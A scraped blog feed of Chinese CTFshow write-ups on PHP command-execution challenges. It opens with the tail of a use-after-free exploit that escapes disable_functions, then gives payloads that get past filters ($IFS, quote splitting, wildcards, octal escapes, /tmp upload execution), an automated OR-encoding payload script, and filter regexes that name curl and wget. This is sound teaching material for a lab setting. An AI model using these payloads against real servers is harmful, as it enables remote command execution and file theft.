= $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); } if(!($elf = parse_elf($base))) { die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); } if(!($zif_system = get_system($basic_funcs))) { die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); } $fake_obj_offset = 0xd0; for($i = 0; $i \u0026lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-\u0026gt;b)($cmd); exit(); } ctfshow(\u0026#34;cat /flag0.txt\u0026#34;);ob_end_flush(); ?\u0026gt; 总结：看不懂，和pwn有关。以后再来~\nWEB73 1 2 3 4 5 6 7 c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;); foreach($a as $f) {echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;); } e xit(0); ?\u0026gt; 直接用上一道题的payload即可，这道题不用uaf直接include即可。\n1 c=include(\u0026#34;/flagc.txt\u0026#34;);die(); ","date":"2025-04-22T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_4/","title":"CTF_show Web 命令执行writeup P4 WEB61-WEB736"},{"content":"CTFSHOW web 命令执行WriteUP Part3 WEB51 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:42:52 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 这里把tac也过滤了，有两种方法： 1.使用\u0026rsquo;\u0026lsquo;绕过过滤 2.使用其他指令绕过比如rev，hexdump，vi，nl\n1 ?c=t%27%27ac\u0026lt;fl%27%27ag.php|| WEB52 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:50:30 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 这次flag在根目录，不过把\u0026lt;也过滤了，可以使用$IFS绕过\n1 2 /?c=nl$IFS/fla\u0026#39;\u0026#39;g|| /?c=ca\\t$IFS/fla\u0026#39;\u0026#39;g|| WEB53 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 18:21:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ echo($c); $d = system($c); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$d; }else{ echo \u0026#39;no\u0026#39;; } }else{ highlight_file(__FILE__); } 本题可以通过反斜杠和引号绕过e.g.?c=nl${IFS}fl\\ag.php ?c=ca\\t${IFS}fl\\ag.php p.s.一个小知识： WEB54 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 19:43:42 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c); } }else{ highlight_file(__FILE__); } tip:过滤了很多命令。中间这些个很多的星号的内容，其实是说，含有cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst，凡是按序出现了cat 都被匹配。这时，我们不能直接写ca?因为这样是匹配不到命令的。只能把全路径写出来，如/bin/ca?，与/bin/ca?匹配的，只有/bin/cat命令，这样就用到了cat命令了。\n这里有两种思路，第一种就是通过疏忽没有过滤的指令来进行读取（查上一章的表），第二种是通过一些特殊方法绕过。\n我先想出来的第一种：\n这里中间加星号的意思就是匹配到例如cxxxxxaxxxt这种字符就过滤掉，这里就不可以出现可以连起来的以上的词，这里我通过hexdump来读取出文件编码，然后通过cyberchef先from hexdump转成原始hex位，再使用Swap endianness进行一次反转，再转换回去就得到了原始的文件。\n这里还可以通过/bin/ca?``mv flag.php 1.txt 这种进行绕过，这里不仔细说了。\nWEB55 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 20:03:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c); } }else{ highlight_file(__FILE__); } 这道题考bash无字母命令执行，这题解法挺多的，这里举例两个：\n1. 由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。\n但因为字母不能传入，我们需要使用通配符?来进行代替\n?c=/bin/base64 flag.php\n替换后payload为：\n?c=/???/????64 ????.??? 2. 使用这种Bash的八进制转义序列：$\u0026rsquo;\\154\\163\u0026rsquo;（ls） $\u0026rsquo;\\143\\141\\164\u0026rsquo;%20*（cat *）\nWEB56 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c); } }else{ highlight_file(__FILE__); } 这次把0-9和a-z全部过滤了，可以利用post方法强制上传一个文件，由于php接收到post方法上传的文件会保存到/tmp/php******这里，可以构造?c=.%20/???/????????[@-[] 等效执行/tmp/phpxxxxxx 解释：1. linux下.可以用于执行文件 2.[@-[] 匹配字符类，匹配ASCII介于 @ 和 [ 之间的字符（即大写字母）\n1 2 3 4 \u0026lt;form action=\u0026#34;http://xxx.ctf.show/\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 打开上面的网页，随便上传一个文件然后用burp抓包，把文件的内容替换成cat flag.php发包即可，可能一次不成功就多试几次就好了（有可能有小写字符）\nWEB57 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-08 01:02:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 还能炫的动吗？ //flag in 36.php if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\x0a|\\\u0026gt;|\\\u0026lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\u0026#34;, $c)){ system(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); } }else{ highlight_file(__FILE__); } 这道题把.给过滤了，上一道题的方法用不了了。\n不过给出了提示：flag在36.php中，那么就可以通过一些特殊的方法构造出“36”\n通过$(())操作构造出36： $(()) ：代表做一次运算，因为里面为空，也表示值为0\n$(( ~$(()) )) ：对0作取反运算，值为-1\n$(( $(($(()))) $(($(()))) ))： -1-1，也就是(-1)+(-1)为-2，所以值为-2\n$(( $(( $(($(()))) $((~$(()))) )) )) ：再对-2做一次取反得到1，所以值为1\n我们在$(( $(( )) ))里面放37个$(($(())))，得到-37，取反即可得到36\nWEB58-WEB60 1 2 3 4 if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); } 这里直接给了eval函数，但是测试了一下system函数被禁用了，不过有很多很多方法可以进行绕过\n1 2 3 4 5 6 7 var_dump() #打印变量相关信息 print_r() #打印多个变量的值，可以打印复杂类型变量的值，如array file_get_contents() highlight_file() show_source() #highlight_file()的别名 readfile() scandir() #用于打印目录下的文件 这里给一个例子：\n1 2 print_r(scandir(\u0026#39;.\u0026#39;)); #打印当前目录文件名字 show_source(\u0026#39;flag.php\u0026#39;); #对文件进行语法高亮显示。 从web58-web65都可以使用highlight_file()绕过，这里不多叙述了。\n","date":"2025-04-15T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_3/","title":"CTF_show Web 命令执行writeup P3 WEB51-WEB60"},{"content":"喵？\n移动端访问这里\r","date":"2025-03-28T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/deepmiao/","title":"本站现已接入AI喵...对吗？"},{"content":"阿伟你又在打电动喔，休息一下吧，去看看书好不好\n移动端访问这里\r","date":"2025-03-22T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/fivechessv2/","title":"五子棋v2.0"},{"content":"CTFSHOW web 命令执行WriteUP Part2 WEB41 过滤不严，命令执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: 羽 # @Date: 2020-09-05 20:31:22 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:40:07 # @email: 1341963450@qq.com # @link: https://ctf.show */ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c = $_POST[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ eval(\u0026#34;echo($c);\u0026#34;); } }else{ highlight_file(__FILE__); } ?\u0026gt; 这次没有思路了，看羽师傅写的程序分析了一下，大体意思就是从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符 羽师傅先把或运算的结果放进txt，然后查表构造payload，用了两个脚本，这里给一个一体化的脚本，直接输入url可以直接获取执行结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import re import urllib from urllib import parse import requests contents = [] for i in range(256): for j in range(256): hex_i = \u0026#39;{:02x}\u0026#39;.format(i) hex_j = \u0026#39;{:02x}\u0026#39;.format(j) preg = re.compile(r\u0026#39;[0-9]|[a-z]|\\^|\\+|~|\\$|\\[|]|\\{|}|\u0026amp;|-\u0026#39;, re.I) if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))): continue else: a = \u0026#39;%\u0026#39; + hex_i b = \u0026#39;%\u0026#39; + hex_j c = chr(int(a[1:], 16) | int(b[1:], 16)) if 32 \u0026lt;= ord(c) \u0026lt;= 126: contents.append([c, a, b]) def make_payload(cmd): payload1 = \u0026#39;\u0026#39; payload2 = \u0026#39;\u0026#39; for i in cmd: for j in contents: if i == j[0]: payload1 += j[1] payload2 += j[2] break payload = \u0026#39;(\u0026#34;\u0026#39; + payload1 + \u0026#39;\u0026#34;|\u0026#34;\u0026#39; + payload2 + \u0026#39;\u0026#34;)\u0026#39; return payload URL = input(\u0026#39;url:\u0026#39;) payload = make_payload(\u0026#39;system\u0026#39;) + make_payload(\u0026#39;cat flag.php\u0026#39;) response = requests.post(URL, data={\u0026#39;c\u0026#39;: urllib.parse.unquote(payload)}) print(response.text) WEB42 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 20:51:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); }else{ highlight_file(__FILE__); } Linus Benedict Torvalds 在/dev/null走了一圈,然后回来了。\n这道题会把回显丢弃，不过由于并不影响传参过程，直接传参?c=cp flag.php 1.txt然后访问url/1.txt就直接获取flag了，下面再介绍一些其他的方法，可以参考一下：\n使用 \u0026quot; ; \u0026quot; \u0026quot; || \u0026quot; \u0026quot; \u0026amp; \u0026quot; \u0026quot; \u0026amp;\u0026amp; \u0026quot; 分隔\n/dev/null 2\u0026gt;\u0026amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显 ; //分号 | //只执行后面那条命令 || //只执行前面那条命令 \u0026amp; //两条命令都会执行 \u0026amp;\u0026amp; //两条命令都会执行\n可构造playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 注意，这里的\u0026amp;需要url编码\nWEB43 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 这道题相比WEB42仅仅多了一层过滤cat指令和分号，使用上一题我的cp传参仍然有效，同时也可以使用\u0026amp;\u0026amp; ||等等，这里不详细解释了\nWEB44 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:01 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 不用多解释啥了，只是多了个过滤flag关键字而已，直接cp f* 1.txt 或者\u0026hellip;tac f*等等等等等都可以的\nWEB45 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:35:34 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| /i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 这次把空格也给过滤了，于是需要payload把空格替换掉，例如：\n使用Tab键（%09） 使用换行符（%0a） 使用$IFS变量（Linux系统中的内部变量，表示分隔符） 使用\u0026lt;（重定向符） 构造payload：\n1 ?c=cp$IFS\u0026#39;f\u0026#39;*$IFS\u0026#39;1.txt\u0026#39; 访问1.txt即可获取flag。\n或者也可以构造这样的payload抵消掉后面的\u0026gt;/dev/null一步完成：\n1 2 3 ?c=tac%09f*.php|| ?c=tac$IFS$f*|| ?c=tac$IFS$f*%26 *必须用%26而不能用\u0026amp;\nWEB46 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 这道题过滤了空格，所有数字以及$和*，怎么办呢？\n我们在shell做了个实验：\n1 2 root@hcss-ecs-b1d9:~# c\u0026#39;\u0026#39;at fl\u0026#39;\u0026#39;ag falg{1s_n0t_h3r3} 可以发现''会被忽略并输出原本的命令内容 '的网页编码为%27\n我们可以根据这个原理构造payload：\n1 ?c=tac%09fl%27%27ag.php|| 这里的数字会被转译为符号，不会被过滤，直接传参即可。\n另外?可以代替*，?指代一个字符位。\nWEB47 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:59:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 和上题基本一样，只是多过滤了一些输出文件的关键词，但是并不影响我们上题payload的思路\n不过这道题也能让我们更加了解终端输出文件内容的一些新的方法，可以积累一下。\nWEB48 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:06:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 同上题目，多过滤了一些可以利用的payload，但是单引号仍然可以使用，下面简单介绍一些这里一些命令的使用方法：\n一些文件内容查看命令的利用方式 more：分页显示文件内容\n1 more flag.php # 分页显示flag.php的内容 less：与more类似，但功能更强大，可以向前翻页\n1 less flag.php # 交互式查看flag.php head：显示文件开头部分\n1 2 head flag.php # 默认显示前10行 head -n 5 flag.php # 显示前5行 tail：显示文件结尾部分\n1 2 tail flag.php # 默认显示最后10行 tail -n 3 flag.php # 显示最后3行 sort：对文件内容进行排序显示\n1 sort flag.php # 按字母顺序排序显示 sed：流编辑器，可以对文本进行替换、删除等操作\n1 2 sed \u0026#39;s/password/PASSWORD/g\u0026#39; flag.php # 替换所有password为PASSWORD并显示 sed -n \u0026#39;5p\u0026#39; flag.php # 只显示第5行 cut：剪切文件的一部分内容\n1 cut -d \u0026#34;:\u0026#34; -f 1 flag.php # 以冒号为分隔符，显示第1个字段 awk：强大的文本处理工具\n1 2 awk \u0026#39;{print $1}\u0026#39; flag.php # 打印每行的第一个字段 awk \u0026#39;/flag/{print}\u0026#39; flag.php # 打印包含\u0026#34;flag\u0026#34;的行 strings：提取文件中的可打印字符串\n1 strings flag.php # 显示flag.php中的所有可打印字符串 od：八进制转储，可以查看二进制文件\n1 2 od -c flag.php # 以字符形式显示文件内容 od -x flag.php # 以十六进制形式显示 curl：网络传输工具\n1 2 curl http://example.com/flag.php # 获取远程文件内容 curl -o local.txt http://example.com/flag.php # 下载到本地 反引号 `：命令替换，执行命令并返回结果\n1 echo `cat flag.php` # 执行cat flag.php并将结果传给echo tac命令（反向cat）：\n1 tac flag.php nl命令（带行号显示）： 1 nl flag.php grep命令： 1 2 grep \u0026#39;\u0026#39; flag.php # 显示所有行 grep -v \u0026#34;不存在的字符串\u0026#34; flag.php # 显示不包含指定字符串的行（即所有行） rev命令（先反转再反转回来）： 1 rev flag.php|rev base64编码： 1 2 base64 flag.php # 然后在本地解码 hexdump： 1 hexdump -C flag.php find命令的-exec选项： 1 find flag.php -exec cat {} \\; while循环读取： 1 while read line;do echo $line;done\u0026lt;flag.php WEB49 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:22:43 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 这道题乍一看把咱们的%转义符号给干掉了，但是实际上并没有，传参到这里以后早就自动转为符号了，所以依然可以使用%xx转义来写payload，WEB46的payload在这里仍然可用。\nWEB50 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:32:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } 这里%09被过滤了，可以换成\u0026lt;这种不需要空格的词。\n1 ?c=tac\u0026lt;fl%27%27ag.php|| 总结 在这一系列的CTF挑战中，我们探索了各种命令执行绕过技巧，从简单的过滤到复杂的多重过滤。以下是我们学到的主要技术：\n空格绕过：\n使用Tab键（%09） 使用$IFS变量 使用重定向符号\u0026lt; 使用单引号\u0026rsquo;\u0026lsquo;分隔 关键字绕过：\n使用单引号分割关键字（如c\u0026rsquo;\u0026lsquo;at） 使用通配符（*和?）替代完整文件名 使用替代命令（tac代替cat） 特殊字符绕过：\nURL编码（如%26代替\u0026amp;） 使用||、\u0026amp;、\u0026amp;\u0026amp;等逻辑运算符分隔命令 输出重定向绕过：\n使用||、\u0026amp;等运算符抵消\u0026gt;/dev/null的效果 文件内容查看的多种方法：\n除了常见的cat，还有tac、nl、grep、rev等多种命令 使用base64编码后在本地解码 这些技巧不仅适用于CTF比赛，也对理解Web安全中的命令注入漏洞防护有重要意义。通过学习这些绕过技术，我们能更好地理解如何构建安全的Web应用，防止命令注入攻击。\n结语\n命令执行漏洞是Web安全中的一个重要方面，通过这系列的CTF挑战，我们不仅学习了如何利用这些漏洞，更重要的是理解了如何防御它们。安全不是一成不变的，攻击者总是能找到新的绕过方法，因此防御者需要不断学习和更新知识。\n","date":"2025-03-17T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_2/","title":"CTF_show Web 命令执行writeup P2 WEB41-WEB50"},{"content":"新年快乐！\n","date":"2025-01-23T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/happy_new_year_2025/","title":"2025新年快乐~"},{"content":"CTFSHOW web 命令执行WriteUP Part1 WEB29-WEB40 WEB29 命令执行，需要严格的过滤\n这里看到用c传参，做了一点简单过滤 不过这点东西怎么能难倒我，哼\n1 2 方法1 c=system(\u0026#34;cp fl*g.php 123.txt\u0026#34;); 访问123.txt即可 方法2 c=system(\u0026#34;tac fl*g.php\u0026#34;) 当然这道题方法太多了，不再举例子了\nWEB30 命令执行，需要严格的过滤\n这道题看描述和上一道题一样，不过代码过滤相对更加严格了一些\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 可以看出过滤了flag system php这些常用的指令和与flag有关的内容，但是exec，passthru等指令仍然没被过滤\n直接故技重施：\n1 ?c=echo exec(\u0026#34;cp fl*g.ph* 1.txt\u0026#34;); 访问url/1.txt直接得到flag\n附：php执行系统指令相关芝士\nWEB31 命令执行，需要严格的过滤 这道题仍然烤命令过滤，打开题看一眼先\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 好家伙，这次过滤了这么多，甚至连空格都给过滤了，怎么办呢，这里偷看了wp，大概有三种方法：\n1.可以构造一个新函数 例c=eval($_GET[a]);\u0026amp;a=system('cat flag.php');因为只判断了传入的c的值，直接新建一个变量直接绕过，这种方法也适用于上面两种\n2.可以利用已知的其他函数来凑出所需要的字符串来绕过 c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 名词解释：\nlocaleconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个\u0026quot;.\u0026quot;\npos():输出数组第一个元素，不改变指针；\nscandir();遍历目录，这里因为参数为\u0026quot;.\u0026ldquo;所以遍历当前目录\narray_reverse():元组倒置\nnext():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以\nshow_source():查看源码\nWEB32 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 